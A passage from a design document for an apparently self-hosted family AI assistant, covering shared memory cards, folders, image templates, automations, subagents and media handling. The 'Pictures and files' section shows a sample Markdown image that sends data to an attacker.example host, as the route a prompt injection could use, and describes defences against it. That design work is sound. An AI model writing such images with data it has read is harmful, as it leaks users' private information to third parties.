  tapping) a dot shows the fact and when it was learned. Below the grid, **Saved from chats** lists
  what the note-taker saved in the last two weeks (four, then Show all), each with its note (which
  scrolls to its card), the chat it came from, when, and Undo. Then every note is rendered as
  Markdown and can be edited, moved (into a category, onto a person's or project's note, or a new
  one; onto one that's there already, it's a merge) or forgotten. The core note comes first, marked as pinned, even before
  it exists, so people can start it there; its editor counts characters against the limit. An edit
  is refused if the agent changed the note after it was opened; saving again then replaces the
  agent's version.

## Cards

Memory belongs to a profile, and a person is usually in several: their own, the family's, one
with a partner, one with a brother, one with friends. Each profile had its own note about them
(`profile_member.person_note`), so they told each one the same things (the languages they speak,
what they don't eat, how they like answers) and the notes drifted apart. One memory for everything
would carry what's said in one profile into the others, and profiles are how people keep their
circles apart: a birthday surprise is planned in a profile without the person it's for. So one
rule: **nothing moves from one profile to another by itself.** Only what someone says about
themselves, and would tell any of their circles, goes with them, on their card
(`packages/core/src/memory-cards.ts`).

- **The card** is one note per user, `~/.nolune/cards/<name>.md`, kept by memory.ts like a
  profile's notes: its functions take `CARDS` in place of a slug (`MemoryPlace` in `paths.ts`),
  and the folder has its own `.facts.json` and `.embeddings.json`. A card's path reads
  `cards/<name>.md` wherever it's used, so `cards/` in a profile's own folder is reserved: a folder
  by that name from before is renamed `old-cards` on first use. The name (`card.name`, a row per
  user) is picked when the card is first needed and fixed after that, like a profile's slug: the
  first name (`cards/anna`), else the whole name (`cards/anna-smith`), else the first with a
  number. A card is titled with its owner's name (retitled when they change it in Settings), may
  have headings, has no categories, can't be
  moved or merged, and holds at most 2,000 characters (`MAX_CARD_CHARS`), since it goes whole into
  every prompt: `nolune memory` and the page refuse more, as for core.
- **Who reads it:** everyone in every profile its owner is a member of (`profileCards`). In each
  of those profiles it's a note like the others, `cards/anna`, for the agent, the note-taker,
  search and the Memory page. Someone who leaves a profile takes their card out of its new chats;
  open ones keep the copy their prompt has. Which profiles a card is in is shown only to its
  owner, since a profile's name can say more than its owner wants said ("Ben's surprise party").
  As with the rest of memory, that's about the web app and the prompts: commands can still read
  the file.
- **What goes on it:** what its owner says about themselves that they'd tell anyone in any of their
  profiles: the languages they speak, their birthday, the city they live in, their job or school,
  what they eat and their allergies, lasting tastes, and how they want nolune to talk to them. And
  whatever they ask to be remembered everywhere. `cardRules()` says it, and what stays, the same
  way to the agent and the note-taker.
- **What stays in the profile:** everything else about them, in their note there (`people/anna`),
  as before: what others say about them, who they are to the people in it (`- Who:`) and what
  they're called there (`- Also called:`), relationships, plans, feelings, health beyond
  allergies, anything that sounds meant for that circle, and what they ask to keep there. When in
  doubt, the profile: a fact put there by mistake costs a repeat, one put on the card by mistake
  reaches everyone in all their profiles. Core's and health's hints say a member's own go on their
  card.
- **Only its owner's words write it.**
  - In the web UI only its owner edits it, on `/card`; everyone else sees it read-only.
  - The agent's `nolune memory add|replace|forget cards/anna` is refused unless Anna wrote one of
    the messages it's answering: the chat's human rows since its last reply without tool calls
    (`checkCardWrite`, with `NOLUNE_CONVERSATION_ID`, in a chat of the same profile). So automation
    runs and subagents, whose chats have nobody's messages, never write a card, and neither does a
    web page or an email the agent read, nor a terminal. `write`, `rm`, `mv` and `merge` are
    refused on cards: a card changes a fact at a time, and only its owner rewrites it.
  - The note-taker changes Anna's card only from a stretch in which Anna wrote something
    (`learnFrom`: the senders of the rows it read); a card change from a stretch where only others
    wrote is dropped and logged.
  - When Anna and Ben both wrote in the same turn or stretch, the checks can't tell whose words a
    fact came from. The rule in the prompts does that, and Anna sees every change to her card.
- **In the prompt:** the list of members says where each one's things go
  (`- Anna Smith: card cards/anna, note people/anna`, `peopleGuide`), and a Cards section after the
  memory rules has each member's card whole, as it was when the conversation started, in
  `<card name="cards/anna" of="Anna Smith">…</card>` (an empty one says so), with the rules and
  the commands. A card that changes reaches new chats, like core, and never rebuilds an open
  chat's prompt. A prompt still depends only on the profile (its members' cards now part of it),
  so chats outside folders keep sharing one.
- **Recall and search** go through the profile's notes and its members' cards together: the
  runner, automation runs and `nolune memory search` pass the cards' paths (`cards` in
  `recallFor`, `recallByWords` and `searchMemory`). Each fact's embedding is looked up in the
  folder its note is in, so a card is embedded once for every profile. A card fact the prompt has
  already doesn't come again; one that changed since the chat started comes along with a message
  like any other. The gateway embeds the cards with the profiles when it starts, and after the
  note-taker changes one.
- **The note-taker** gets the members' cards in `<cards>`, each with the room left on it, and the
  same rules as the agent; `add` and `replace` take `cards/<name>` like a note. A full card refuses
  the add, like a full core.
- **Seeing what changed.** Every change to a card that its owner didn't make on the page is a
  `memory_change` row with the profile and chat it came from and its `source`: `learning` for the
  note-taker, `agent` for the agent's `add` and `replace` (`recordAgentCardChanges`; a `forget`
  never puts anything on a card, so it isn't kept). A chat's "Saved 3 memories" row and a
  profile's "Saved from chats" show only `learning` rows, the agent's showing as its commands, and
  "Saved from chats" only from that profile's chats, so a card never says where it learned
  something to someone who isn't in that profile. A card change there shows whose card it is
  (`DisplayMemoryChange.card`), and only its owner gets Undo (`undoMemoryChange` takes who asks;
  anyone else gets `owner`) and **Keep only here** (`keepOnlyInProfile`,
  `/api/card/changes/<id>/keep`), which takes the fact off the card, into their note in the
  profile it came from, and marks the change undone.
- **On the Memory page** the members' cards with facts are in the dot grid right after core, under
  Cards, each with its owner's avatar, and have a section each after core's: pinned, "goes with
  them into all their profiles", read-only. The viewer's own is "Your card", with a link to
  `/card` and the names of the profiles that read it. While it's empty and their notes say things
  about them, a banner offers to make it.
- **`/card`**, in the user menu, is the signed-in person's card: edited in place (with a count of
  characters against the limit, and the same conflict check as notes on the Memory page) or
  emptied, the profiles that read it, what nolune changed on it in any of them with where it came
  from, Undo and Keep only here, and **Bring in from your notes**.
- **Starting a card** from the notes people already have, never without them (`cardCandidates`,
  `bringToCard`). Bring in lists the facts in their note in each profile they're in and the lines
  of each profile's core that start with their name (`Anna: keep answers short`, from an import,
  offered without the name), grouped by profile, each with a box. Checked at first: what two or
  more of their notes say (matched as `.facts.json` matches facts: by words, ignoring case and
  spacing) and those core lines; the rest unchecked. `- Who:` and `- Also called:` lines aren't
  offered, and neither is what the card has already. Adding puts the checked facts on the card
  once each, under the heading they had (else About, and Instructions for core's), with the
  earliest date any copy had, and takes them out of the notes they came from, which read the card
  now. What doesn't fit stays where it was.
- **The welcome's import** (`importMemoryExport`) is about the person importing, so their
  instructions, identity and preferences go on their card while it has room, without their name
  in front; the rest, and what didn't fit, goes where it went before.
- **`nolune memory`** takes `cards/<name>` for the members' cards: `list` shows them apart,
  `show` and `search` read them, and `add`, `replace` and `forget` write them with the checks
  above. `nolune card [<name|email>]` prints a card from a terminal, or lists everyone's.
- **Deleting a user** moves their card to `~/.nolune/trash/card-<name>-<time>.md`, like a deleted
  profile's folder, and their `card` row goes with the user.

## Soul

Each profile can give nolune a soul, like [SOUL.md](https://soul.md): who it is for this family (its
character, values, tone and boundaries) rather than facts about them, which go into memory. It is
`~/.nolune/profiles/<slug>/soul.md`, trimmed, at most 4,000 characters
(`packages/core/src/soul.ts`).

- **In the prompt:** a "Your soul" section right after the first line, with the text in
  `<soul>…</soul>`, so it frames everything after it; the rest of the prompt still applies.
  Without one, the section says there is none yet and how to start it. A file made longer in an
  editor is cut at a line, with a note to shorten it.
- **Changes reach open chats:** each conversation keeps the soul its prompt was built with
  (`conversation.soul`). At the start of a turn (never in the middle of one), if the profile's soul
  differs, the prompt is built again, like when the folder changes (`withCurrentContext` in
  `runner.ts`, one cache miss). Chats from before souls existed have `''`, so they are left alone
  until a profile gets one.
- **Who changes it:** the family, in the Soul box of the profile's settings (People & profile), and
  the agent itself: the prompt tells it the soul is its to shape when someone asks it to be
  different, to write the whole new text with `nolune soul write` (stdin), and to say what it
  changed. `nolune soul` prints it and `nolune soul rm` removes it.

## Folders

Folders group a profile's chats, like projects in ChatGPT: the chats in a folder share its
context, which the family sets on the folder's page (`/p/<slug>/f/<id>`).

- **What a folder has:** a name, instructions (up to 8,000 characters) and up to 50 files. Files
  are uploaded like the composer's attachments, copied into `profiles/<slug>/folders/<folder>/`
  (the folder's slug is fixed when it's made, like a profile's) and kept in the media store for
  the page, which shows pictures and serves downloads from there, never from the copy.
- **In the prompt:** a `# Folder` section at the end of the system prompt, after the skills, so
  everything before it is the same as in the profile's other chats: the folder's name, its
  instructions, and one line per file with its path, type and size. Pictures and documents are
  not attached; the agent opens the ones that matter with commands and `nolune view`. A folder with
  many files costs a few lines per chat, and nothing counts against the conversation's picture
  and PDF limits.
- **Starting in a folder:** the composer on the folder's page, or the folder chip in the new
  chat composer (`?folder=<id>` preselects it), whose menu also makes a new folder.
- **Moving chats:** drag a chat onto a folder in the sidebar (its row, or its chats when it's
  open), or onto the Chats list to take it out; or use "Move to folder" in a chat's menu (the
  sidebar's or the chat header's). Moving only sets `conversation.folder_id`.
- **Dragging** (`packages/web/src/lib/chat-drag.svelte.ts`) uses pointer events for a mouse or pen and touch
  events for fingers, not the browser's drag and drop, so it works the same on phones. A mouse
  drags after moving 4px; a finger after a 400 ms long press, and moving earlier scrolls the list
  as usual. The row only moves up and down and stays inside the sidebar's list, which scrolls
  near its edges. The chat leaves its place, and the group under it opens a gap where it will
  land: groups are ordered by recent activity, so that's its place in that order, not wherever
  the pointer is. Holding it over a closed folder for a moment opens the folder; dropping on a
  closed folder's row slides the chat into it. Escape puts it back. On touch screens a blocking
  `touchmove` listener sits on the list from the start (the browser only waits for listeners
  that were there when the touch began), and stops the scrolling once a chat is picked up.
- **The prompt follows the folder.** Each conversation stores the folder section its prompt was
  built with (`folder_context`). At the start of every model call the runner renders the section
  the chat should have now (its folder's current name, instructions and files, or nothing) and,
  if it differs, builds the whole system prompt again, so moving a chat, and editing a folder's
  instructions or files, reaches its chats at their next message. Several edits between two
  messages cost one rebuild. It waits while a turn is in progress (the last reply called a
  command): the model is still working under the prompt it started with.
- **What a rebuild costs.** The system prompt is the start of the cached prefix, so the next call
  reads the whole conversation again once (the chat marks it as a cache miss). It also
  invalidates the thinking in earlier replies: a thinking block's signature records the prompt
  it was made under, and Opus 5.5 and Fable 5.1 refuse it under another one (a 400 on accounts
  created since 2026-08-31, and silently accepted on older ones). So the conversation remembers
  its last row before the rebuild (`prompt_changed_at_seq`), and every later call sends the
  replies up to it without their `thinking` and `redacted_thinking` blocks. Those are the oldest
  blocks in the conversation, which the API allows to be left out, and they're left out the same
  way on every call, so the prefix is stable again after the one miss. The stored rows stay as
  they are.
- **Deleting a folder** moves its chats back to the Chats list (their prompts lose the folder at
  their next message) and its files to `~/.nolune/trash/`. Removing one file deletes its copy
  unless it changed since it was added.

## Making pictures

The agent makes pictures with `nolune generate image`, a command like `nolune view`: no new tool, nothing
in the system prompt beyond the skills catalog. The built-in `generate-images` skill explains it,
how to write prompts, and how to run the Images page's messages.

- **Providers** (`packages/core/src/image-generation.ts`). Models are named `<provider>/<model>`
  (`openai/gpt-image-2.5-flare`, the default; `nolune config set image-model`). Each provider is one
  module with the same shape, registered in `PROVIDERS`: its key check, its qualities, how many
  input pictures it takes and which formats, and `generate`. `openai.ts` is the only one today:
  `/v1/images/generations` for a prompt, `/v1/images/edits` (multipart) when pictures are given,
  with plain `fetch` rather than the SDK. OpenRouter, fal or Higgsfield would each add a module;
  shapes (`square`, `portrait`, `landscape`, `auto`) are provider-neutral and each module maps them
  to its own sizes.
- **Keys** live in `config.json` (`nolune key set openai` or Models & keys), with `OPENAI_API_KEY` as a
  fallback, and are read by the CLI, so the gateway itself never calls the image API.
  `OPENAI_BASE_URL` points it at a proxy or a compatible server, as in OpenAI's SDKs.
- **Input pictures.** PNG, JPEG and WebP are sent as they are (JPEGs without EXIF, which carries GPS
  positions); other formats, sideways photos and files over 25 MB go through `nolune view`'s converter.
- **Output** goes to the profile's `images/` folder (or `--out`), and the command prints a `Saved
<path>` line per picture, which the agent shows with `![...](path)` like any other picture.
- It checks everything (key, options, input files) before saying it has started, and a request
  times out after 5 minutes; the skill tells the agent to allow 300 s.

### Templates and the Images page

The Images page (sidebar, `/p/<slug>/images`) is one grid of templates, like ChatGPT's; tabs
appear only when templates name more than one category. Opening one shows a sheet (from the
bottom on phones): its picture, title and description, and what to do next, which depends on the
template.

- **The sheet's buttons** depend on where the picture comes from: "Take a photo" (phones) and
  "Choose a photo" for templates that start from a photo, "Start drawing" and "Use a photo of a
  drawing" for those that start from a drawing, and "Try it" for the rest. Templates without
  settings start the chat as soon as the picture has uploaded; there is nothing to fill in.
- **Templates with settings** go on to a sentence with a chip for each: "Make a [watercolor ⌃]
  storybook page where the kid in [🖼 ⌃] [rides a dragon to school]." A choice is a chip that opens a
  menu of the others (bits-ui's Select); where the template allows it (every Style and Theme), the
  menu ends with "Custom…", which turns the chip into a field for the person's own choice, with ⌃
  back to the list. Free text is an inline field, emoji are a chip that opens an emoji picker, and
  the picture is a chip that picks another (for drawing templates, a menu: draw, or choose a photo
  of a drawing). Punctuation right after a chip stays on its line, and "a" before one becomes "an"
  when the choice starts with a vowel sound ("an origami sticker pack"), on the page and in the
  message. Anything typed below the sentence is added to the prompt, and the shape is a chip next to
  Generate.
- **The emoji picker** is [emoji-picker-element](https://github.com/nolanlawson/emoji-picker-element)
  (search, categories, skin tones), in a popover under the chip: taps add emoji up to the
  setting's `max`, one more pushes out the oldest, and ⌫ removes the last. Its data
  (`emoji-picker-element-data`) is bundled and served by nolune rather than fetched from a CDN, and
  the picker keeps it in IndexedDB after the first open. It's styled with nolune's colors in both
  themes.
- **Drawing** is a full-screen canvas: pen with a size slider, eraser, colors, undo. It keeps the
  strokes as fractions of the side, so it survives resizing, and ✓ exports a 1024×1024 PNG that
  is attached like a photo.

Generate starts a new chat (default model, reasoning `low`) whose first message holds the picture
and the finished prompt; the model names the chat as usual. A text box below the grid ("Describe
an image", with the chat's paperclip) does the same with the person's own words.

- **A template** is a folder with a `TEMPLATE.md`: YAML frontmatter (name for its card, `title` for
  its sheet, description, category, a Lucide `icon` and hex `color`, whether it needs a picture and
  whether that's a photo or a drawing (`image-source`), the default shape, its settings: `options`
  with a label and the `prompt` fragment each stands for (`custom: true` also takes a typed choice
  as it is, `custom: 'Style: {{style}}.'` says how it's worded, and typed text that matches a label
  is that option), free text, or `type: emoji` with a `max` (up to 4 by default), picked with a real
  emoji picker, and the `sentence` that shows them as chips), then the prompt: the instructions for
  the image model. `{{setting}}` is replaced by the choice, `{{#setting}}…{{/setting}}` is kept only
  when it has a value and `{{^setting}}…{{/setting}}` only when it doesn't; `{{image}}` is "the
  attached picture" when one was given, and `{{aspect}}` the chosen shape in words ("square (1:1)",
  empty for auto). A prompt that uses `{{aspect}}` says the shape where it wants ("a single
  {{aspect}} transparent sticker sheet"); others get "Make it square (1:1)." at the end. Options
  whose labels have no letters are their own value. A line that held only sections left out
  disappears. A square `cover.png|jpg|webp` next to it replaces the icon; the card's title sits over
  its bottom fifth. The built-in covers were made with the image model and shrunk to 768px WebP.
- **Sources**, like skills: the 19 that ship with nolune (`packages/core/image-templates`),
  `~/.nolune/image-templates`, and the profile's `image-templates` folder; a later one
  overrides an earlier one with the same id.
- **Applying a template just sends a prompt.** The message is the finished prompt, as the family
  reads it in the chat: the sentence with the choices' labels, the instructions with the
  choices' prompts, the shape in words, and what the person typed.

  ```
  Make a watercolor storybook page where the kid in the attached picture rides a dragon to school.

  A full-page children's picture-book illustration of the adventure.
  …
  Make it portrait (2:3).

  Give the dragon a backpack.
  ```

  The skill tells the agent to pass a detailed prompt like this unchanged on stdin (a heredoc,
  so quotes can't break the command), to turn "square (1:1)", "portrait (2:3)", "landscape
  (3:2)" and "transparent background" into flags, and to pass the attached pictures as
  `--image`. Templates are only the page's business: `nolune generate image` takes a prompt and
  pictures, whoever wrote them.

- **Pictures** go through the chat's attachments: they upload as soon as they're picked, and the
  message carries their ids, so the model sees each one with the path it was saved at in
  `attachments/` (see [Attachments](#attachments)); the skill passes that path as `--image`.
  Templates take only pictures.

## Automations

Triggers run the agent without anyone sending a message. What they find goes to notifications, not
into conversations.

- **Trigger** (per profile). _When_: a 5-field cron expression in the gateway's local time zone, a
  one-time `runAt`, or a webhook: `POST /api/hooks/<secret token>` with a JSON body (64 KB max;
  SvelteKit's cross-site check refuses form-encoded and text/plain bodies in production). _What_:
  a prompt for the agent, or a shell command that runs without the model. Script triggers make
  polling cheap: the script checks the email, the price or the page, and runs
  `nolune wake "<what happened>"` only when the agent is needed.
- **Who sets them up:** the agent, with the `nolune trigger` command. There is no new tool and nothing
  in the system prompt beyond the skills catalog: the built-in `automations` skill explains
  `nolune trigger` and `nolune wake`, and is read only when someone asks for a reminder or a check. Members
  see, edit, run, pause and delete them on the profile's Automations page. There is no create form.
- **The Automations page** is for the family, not the agent. Each trigger shows its `icon` and a
  one-sentence `summary` (written by the agent with `--summary` / `--icon`, like `run_command`'s),
  its schedule in plain words (`describeCron`: "Every weekday at 07:30"; the cron itself only with
  technical details on) and relative times ("next Monday at 07:30"). The prompt, script and webhook
  URL are behind Edit. Above the list, a month calendar (whole weeks, Monday first, `?month=`
  to page) shows an icon per trigger on each day and the chosen day's list below it: before now,
  what ran and how it went (agent runs, and failed scripts once a day; runs are kept 30 days, so
  it goes back no further), after now, what the schedule will run. A trigger firing more than 4
  times a day on average is listed once above the grid instead.
- **Runs.** Every firing (schedule, webhook, `nolune wake`, Run now) inserts a `pending` row in
  `trigger_run`. The gateway's scheduler ticks every 5 s: it fires triggers whose `nextRunAt` has
  passed and starts pending runs. The CLI only writes rows, so `nolune wake` from a script is picked up
  within a tick. At most 3 agent runs go at once, a script trigger runs one at a time, and a
  scheduled firing is skipped while the trigger's previous run of the same kind is unfinished.
- **Missed firings** (Mac asleep, gateway down) collapse into one catch-up run, because the next time
  is computed from when the trigger actually fired.
- **Agent runs** happen in a hidden conversation (`conversation.hidden`) through the normal runner.
  Its first row has kind `trigger`: the model sees `[Automation "<name>" · <why> · <time>]`, the
  prompt, the webhook body, and instructions to keep the final reply short or answer only
  `NO_NOTIFICATION`. The system prompt is the ordinary one, so runs share the profile's cached prefix.
- **Finishing.** When a run's loop ends (`onLoopEnd`): an API error becomes an error notification, a
  final reply becomes a notification with that text, `NO_NOTIFICATION` on the last line (or no text)
  is recorded as `silent`, and a run someone stopped is `stopped`. None of these notify twice.
- **Script runs** execute like `run_command` (login shell, profile folder, the same environment plus
  `NOLUNE_TRIGGER_ID` and `NOLUNE_PAYLOAD`) with a 10-minute timeout, keeping the last 4 KB of output. A
  failing script notifies once, when it starts failing, not on every run.
- **Notifications** belong to the profile, like conversations. Dismissing is per person
  (`notification_dismissal`), and unread means newer than when that person last opened the menu
  (`notification_seen`). Pages listen on `/api/events` (SSE), which also carries profile renames and
  avatar changes, and reload the bell on change.
- **Continue in chat** unhides the run's conversation, which moves into the sidebar with its whole
  transcript; sending a message into a hidden run does the same. A notification without a
  conversation (script failures, or the run was deleted) starts a new conversation whose first
  reply is the notification text.
- **After a restart**, agent runs that were in progress continue (the interrupted command gets the
  usual "restarted" result) and script runs in progress are marked failed.
- **Retention:** finished runs, notifications and hidden conversations are deleted after 30 days, and
  only the last 100 runs of each trigger are kept.

## Subagents

A subagent is another agent that a chat's agent starts to work on a task in the background: big
jobs that would fill the chat with reading (research across many pages, going through a folder
of documents), several independent jobs at once, or long ones the agent shouldn't sit in. Like
automations, it's a CLI command and a built-in skill (`subagents`), not a tool.

- **`nolune agent run [<id>] --prompt "<task>"`** (`--prompt -` reads stdin) writes a `subagent` row
  and a hidden conversation for it, whose first message is the task, queued as an `agent_message`
  with a note saying it's a subagent, nobody can answer questions, and its last message is its
  result. It returns at once with the id (`agent-1`, `agent-2`, … or one the agent gives), the log
  path, and how to hear back. Given the id of one that finished, it queues more work in the same
  conversation instead. At most 5 work at once per chat, and subagents can't start subagents.
- **It doesn't inherit the chat.** Its conversation has a system prompt built for it from the
  profile as it is now (skills, memory notes, and the chat's folder if it's in one), the current
  tools, and a 5-minute cache. Nothing of the parent's transcript comes along: the prompt must say
  everything it needs.
- **Model and reasoning:** the chat's, unless `--preset <name|id>` (resolved like
  `nolune wake --preset`) or `--effort <level>` say otherwise. The skill tells the agent to run
  `nolune preset list` and pick a name from it, never to make one up, and suggests a smaller model and
  `low` for simple reading-heavy jobs. More work may come with another `--preset` or `--effort`,
  which switch the subagent's conversation as in a chat (one cache rebuild).
- **The gateway runs it** (`subagent-host.ts`), like `nolune wake`: the CLI only writes rows, and the
  scheduler (every tick, and right after each of the agent's commands) starts `pending` subagents
  through the normal runner. When its loop ends it is `done`, `failed` or `stopped`; one still
  waiting for its own background commands stays `running` until they end.
- **`nolune agent watch <id>`** polls until its current work has ended and prints its last message
  (exit 1 with the reason if it failed or was stopped). The agent runs it with
  `run_in_background`, so the result arrives as a background command's output: the agent can do
  other work or end its turn meanwhile, and hears back as a message.
- **`nolune agent steer <id> --prompt "…"`** queues a message the subagent reads at its next step,
  and marks it `pending` so the gateway starts it if it was waiting. A steer and the end of a loop
  can't miss each other: both check the other side in a transaction, and a loop that ends with a
  message queued starts again.
- **The log** (`profiles/<slug>/agents/<chat>/<id>.log`) gets every row the subagent's
  conversation commits, as the gateway's runner emits it: messages from the agent that started it,
  what it wrote, the commands it ran and the start of their output. Never its reasoning. The agent
  reads it with `tail` when someone asks how it's going.
- `nolune agent stop <id>` asks the gateway to stop it; `nolune agent list` shows the chat's subagents.
- **In the web UI** a subagent's chat opens from the chat's background list and has no composer:
  only the agent that started it writes there, though people can Stop it. Its banner links back.
- After a restart, subagents that were working start again (their interrupted commands get the
  usual result). A deleted chat takes its subagents' conversations with it; subagents are hidden
  conversations, so they're also deleted after 30 idle days.

## Pictures and files

The agent shows a picture by writing a Markdown image, `![what it shows](path)`, and hands over a
file by linking it, `[Tax form](path)`. The system prompt explains this (so only conversations
created since know it). There is no new tool and the reply's `content` is never touched, so the
cached prefix doesn't change.

- **What counts** (`@nolune/core/media-refs`): images whose target is a path on the computer (absolute,
  `~/…`, relative to the profile folder, or `file://`) or an http(s) URL, and links whose target is
  a path. Links to web pages stay links. It reads the text with marked's lexer, so code spans and
  code blocks are skipped, and the browser renders with the same file, so both agree.
- **Copied when the reply is saved.** After a model call, before appending its row, the runner copies
  every target into `~/.nolune/media/<sha256>` in its original size and bytes (remote pictures are
  downloaded, with a 30 s timeout), then appends the row and one `media` row per target in the same
  transaction. The chat keeps showing a picture after the original is moved, edited or was a
  temporary file, and background runs nobody opens for days keep theirs. The streamed reply stays
  on screen meanwhile; Stop aborts the copying.
- **Web pictures only from links the agent found.** The gateway downloads them itself, so without
  a rule a reply containing `![x](https://attacker.example/p.png?d=<something the agent read>)`
  would hand that data to the attacker as soon as it's saved, and a prompt injection would only
  have to get the model to write a picture, a lower bar than getting it to run `curl`. So a web
  picture is downloaded only if its exact link appears earlier in the conversation, in what a
  person wrote, an automation's prompt or event, or a command's output: the agent found the link
  rather than built it (the rule of Anthropic's web fetch tool). The agent's own replies and
  commands don't count; the match must be the whole link, not the start of a longer one; `&amp;`
  and `\/` read as `&` and `/`, so links copied out of HTML and JSON match. Otherwise the row says
  "Web pictures are shown only when nolune found the link on a page or in a message", and the system
  prompt tells the agent to download other pictures and show the file. This narrows the channel
  rather than closing it: a reply can still choose which of the links it found to show, and a
  command can print any link, but an agent that runs commands can already send anything with
  `curl`.
- **Never from this computer or the local network.** Downloads use Node's `http`/`https` with a
  DNS lookup that refuses loopback, private, shared (CGNAT, Tailscale), link-local, multicast and
  reserved addresses, and this computer's own addresses. Node calls it for each connection, so the
  address checked is the one connected to (a name can't resolve to a public address for the check
  and a local one for the connection). IP addresses in a link are checked before connecting, and
  each redirect (up to 5) goes through the same checks.
- **Limits:** 100 MB per file, 30 per reply. `config.json` and the database are never copied. A
  target that can't be copied gets a row with the reason in plain words (not found, a folder, too
  large, not a picture, a web link the agent didn't find, a local-network address, the download
  failed), which the chat shows in its place.
- **Types come from the content.** A picture is never recognized by its extension. HEIC and TIFF
  (and camera RAW files) also get a full-size JPEG copy for display, made with macOS's `sips`; the
  download is still the original. Elsewhere they are shown as downloads. Width and height (with
  EXIF rotation applied) are read from the file header, so the chat reserves the space before a
  picture loads and stays scrolled to the bottom.
- **Serving:** `GET /api/c/<conversation>/media/<id>` checks that the user belongs to the
  conversation's profile and serves the copy by its random id; it never takes a path. Pictures are
  sent inline and everything else as an attachment; `?download` sends the original. Responses
  carry `nosniff`, a sandboxing CSP (an SVG opened in its own tab can't run script) and an
  immutable cache header.
- **The chat only loads nolune's copies.** The Markdown renderer swaps each target for its copy: a
  picture (click to open a viewer with a Download button, which goes through the message's other
  pictures with its arrows, the arrow keys or a swipe), a download card for files and for
  pictures browsers can't show, or a pulsing placeholder while the reply is still streaming.
  DOMPurify drops any other `<img>` source, `<style>`, inline styles, `srcset`, audio, video and SVG
  images, so the browser never loads anything a reply names from another site without a click. The
  gateway's own downloads are what the two rules above guard.
- **Cleanup:** `media` rows go with their conversation. The scheduler's hourly prune deletes stored
  files that no row points to any more and that are over an hour old (so a copy about to be saved
  is safe). Identical files are stored once.
- The notification menu shows pictures as `[their description]` and file links as their label.

## Web UI

It follows the ChatGPT app: a sidebar with chats, a centered column of messages, and a rounded
composer. Most of the family doesn't read shell, so the default view hides the machinery.

- **Components** are [shadcn-svelte](https://shadcn-svelte.com) (Luma style, neutral base) in
  `packages/web/src/lib/components/ui`, generated by its CLI and owned by the repo; `components.json` records the
  settings. Colors are CSS variables in `packages/web/src/routes/layout.css`, with a dark theme
  (`mode-watcher`: system, light or dark). The fonts, Figtree and Fira Mono, are bundled from
  Fontsource and served by the app, so they don't depend on the OS or a font CDN.
- **Replies** are built by `buildTranscript` (`packages/web/src/lib/transcript.ts`): text blocks are shown as
  Markdown (`marked` + DOMPurify), and every run of thinking and commands between two texts is one
  collapsible group, "Worked for 12s" when done and a live "Thinking" / current step while running.
  Durations come from row timestamps, so they're approximate. The profile's assistant avatar sits at
  the top left of each reply: in the margin when the chat is wide, on its own line when it isn't.
- **Steps** show the `summary` and `icon` the model wrote with each `run_command` call ("Checking
  tomorrow's weather in Berlin" with `cloud-sun-rain`), in the conversation's language. Opening a
  step shows the command and its output. Calls from before summaries existed say "Ran a command".
  Any Lucide icon works: `/api/icons/<name>` serves one icon's drawing from the `lucide` package, so
  pages don't download all two thousand; unknown names fall back to a terminal icon.
- **Technical details** (Settings, per device, in the `nolune-prefs` cookie so the server renders it
  too) switch the labels to the raw commands and add context size, prompt-cache hit rate, cache
  misses, per-reply token usage and the model that wrote each reply. "Always show steps" opens the
  groups by default.
- **Your name and picture** are at the top of Settings. Unlike the rest of Settings they belong to
  the account, and everyone sees them. A name is checked as `nolune user create` checks one
  (`renameUser`): not empty, at most 64 characters, no `@` (which `findUser` takes for an email),
  and nobody else's, ignoring case. Messages keep the name they were sent with, which is also the
  one the model read, so the chat tells someone's own messages by their user id. A picture is
  cropped in the browser (`PictureCropper.svelte`: drag or the arrow keys move it, the slider,
  the wheel or a pinch zoom it) to a 256-pixel square, sent as WebP (PNG where the browser can't
  write WebP) to `PUT /api/me/picture`, checked to be a PNG, JPEG, GIF or WebP of at most 1024
  pixels a side and 512 KB, and kept in the media store under its SHA-256 (`user.picture`), which
  the prune leaves alone. `/api/pictures/<sha256>` serves a hash only while it is someone's
  picture, to anyone signed in, and lets the browser keep it for good: a new picture has a new
  address. Pictures show wherever the initial did: the user menu, People & profile, over someone's
  messages and while they type, and their note on the Memory page. A change reaches open pages the
  way a profile's new avatar does, since `noticeProfileChanges` counts the members' names and
  pictures as part of a profile's look. better-auth's own `/update-user` is off, so nothing gets
  past these checks, and the picture isn't better-auth's `image`, which that endpoint would let
  anyone set to anything.
- **The composer** is docked over the end of the chat and of the Images grid (`ComposerDock`):
  what scrolls under it fades and blurs into it instead of stopping at an edge, and the scroll
  area pads its end by the composer's height so the newest message still clears it.
- **New chat** is the empty composer: the first message creates the conversation and is sent in
  the same request. Model and reasoning are picked from the chip in the composer: the model starts
  at the default preset, reasoning at the level last used on this device. In an existing chat both
  can change (see [Switching models](#switching-models)). The folder chip next to it starts the
  chat in a folder.
- **The reasoning slider** in the chip's menu (`EffortSlider.svelte`) is a trip away from a dying
  star, after Outer Wilds, in a window of the welcome's space whatever the theme (it takes the
  dark theme's avatar colors). The profile's avatar, in a ring, is the thumb; the track runs out
  of the star at the left, and the further the avatar flies, the higher the level. The star goes
  through its life with the levels: a calm star, warmer, orange, a swelling red giant, and at the
  top a supernova (a flash, a pulsing core, shock waves and debris after the avatar, which
  shakes). The stars stream past faster at each level, to warp streaks at the top, the avatar
  trails longer and moves more (its `thinking` and `working` moods), and the fill glows in the
  star's color. A drag follows the pointer, leans the avatar into fast moves and springs onto the
  nearest level when let go; that is when the level is taken. A hidden range input carries the
  keyboard (arrows, Home, End; the menu would otherwise move focus to its items on up and down)
  and screen readers, and its steps are taken once they settle for 600 ms, or on Enter, or as the
  menu closes, so going up several levels in a chat that asks first asks once. The chat closes
  the menu while it asks, so the slider never shows a level that isn't set. The level's name
  rolls in the window, its hint fades in under it, and with reduced motion only the stage
  changes.
- **Suggestions** under the new-chat composer (`packages/core/src/suggestions.ts`) come from the
  profile's memory, and each member gets their own. Until it has any, they are four general ones
  (a reminder, a weather check, finding a file, free disk space). After that, the default preset is
  asked, with `quickReply`, for four things the person looking at the page might ask nolune, each built
  on something in the notes, preferably about them or what they take part in, written as they
  would write it and in the notes' language: a label, a Lucide icon and the text the chip puts in
  the box. It gets today's date, the person's name and the notes, the core note first and then the
  most recently changed, up to 12,000 characters. Each member's are saved in
  `memories/.suggestions.json` under their user id, with a hash of the notes and their name, so
  the page only asks again when memory changed, they were renamed, or theirs are a week old; that
  is one call per member who opens the page, not one per profile. Someone's that weren't made again
  in 90 days are dropped, most likely a member who left. The page renders the saved ones (or the
